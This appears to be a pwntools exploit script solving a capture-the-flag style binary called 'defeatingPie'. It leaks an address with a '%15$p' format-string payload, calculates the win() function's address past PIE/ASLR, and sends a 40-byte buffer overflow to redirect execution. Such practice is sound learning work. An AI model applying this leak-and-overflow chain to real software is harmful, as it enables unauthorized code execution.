from pwn import *

#context.log_level='warn' #Stop pwntools from logging process ID     and etc. so we only get the info we need.
elf = context.binary = ELF("./defeatingPie")

context.terminal = ["tmux", "splitw", "-h"] #to open gdb vertically

if args.GDB:
    p = process(elf.path)
    g = gdb.attach(p)
else:
    p = process(elf.path)

wintomain = 0x121

baseAddrOffset = 0x52a0


#ASLR bypassing

#With ASLR diasbled debugging
mainAddr = 0x5555555552ce
userData1Addr = 0x55555555531e
userData1Ret = 0x555555555323 # %16$p

data1ToWinOffset = 0x17a #Subtract form userData1Ret to get correct address of win()






#Interaction 1 - leaking and then calculating PIE offset/piebase:
payload1 = b"%15$p"
p.recvuntil(b"data:\n")
p.send(payload1)
p.recvuntil(b"entered:\n")
#pieAddr = int(p.recv()[0:14], 16)
#log.success("Leaked address: " + hex(pieAddr))
aslrAddr = int(p.recv()[0:14], 16)
log.success("Leaked address: " + hex(aslrAddr))


#Calculating the pie base address:
#pieOffset = 0x52a0 #Leaked a value twice using %p and then i calculated the difference
#pieBase = pieAddr - pieOffset #Setting piebase on elf


#Calculating the win() address:
#staticWin = 0x11a9

#winAddrOffset = 0x11ad
#realWinAddr = pieBase + staticWin
realWinAddr = aslrAddr - data1ToWinOffset

#Interaction 2 - Making the buffer overflow and returning to win():
offset = b"A"*40
payload2 = offset
payload2 += p64(realWinAddr)

p.clean()
p.send(payload2)
p.interactive()
